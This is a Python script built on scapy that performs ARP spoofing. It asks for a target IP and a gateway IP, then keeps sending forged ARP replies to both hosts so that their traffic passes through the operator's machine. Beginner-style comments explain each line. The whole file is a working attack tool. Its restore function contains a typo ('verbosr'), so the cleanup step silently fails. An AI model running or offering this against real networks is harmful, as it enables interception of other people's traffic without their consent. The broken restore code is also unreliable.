#!/usr/bin/env python3
import scapy.all as scapy
import time

## function to spoof, tip means target ip and sip means spoof ip
def spoof(tip, sip):
    ## tmac is target mac
    tmac = gm(tip)
## creating a packet, op is 2 to send a response not a request, pdst is target ip, hwdst is target mac, psrc is gateway ip.
    packet = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=sip)
## below code will send the packet, In brackets you have to specify the packet name created.
    scapy.send(packet, verbose= False)

## Fuction To Get Mac Address
def gm(ip): 
    ## ar means arp request, creating a arp request 
    ar = scapy.ARP(pdst=ip) 
    ## seting destination mac to broadcast mac
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    ## Combining broadcast and arp request together
    arb = broadcast/ar 
    ## srp is used to send packets, ans = location where answered packets are stored, unans = location where unanswered packets are stored.
    ans = scapy.srp(arb, timeout=2, verbose=False)[0]
    ## 
    return ans[0][1].hwsrc

## dip means destination ip (Router ip), sip here means source ip
def restore(dip, sip):
    dip_mac = gm(dip)
    ## sm = source mac, gm is get mac function, sip is source ip
    sm = gm(sip)
    ## op = 2 means its a response not a resquest, pdst= destination ip, hwdst= hardware address mc, psrc= source ip, and hwsrc is hardware source
    packet = scapy.ARP(op=2, pdst=dip, hwdst=dip_mac, psrc=sip, hwsrc=sm)
    scapy.send(packet, count=4, verbosr=False)
    

    ## Below Code Will Show Packet Contents
    #print(packet.show())

## Below Code Will Show Summary
#print(packet.summary())


## tarip means target ip, and gateway is self explainitory
tarip = input("Enter Target Ip: ")
gateway = input("Enter Gateway: ")

sent_packets_count = 0
try:
    while True:
        spoof(tarip, gateway)
        spoof(gateway, tarip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets Sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected CTRL + C .... Resetting.")
    print('Sending Reset Packets')
    restore(tarip, gateway)
    restore(gateway, tarip)

except IndexError:
    print('\nIp Address Or Gateway Not Found')

except OSError:
    print('\nIp Address Or Gateway Not Found')

except TypeError:
    print('\nIp Address Or Gateway Not Found')
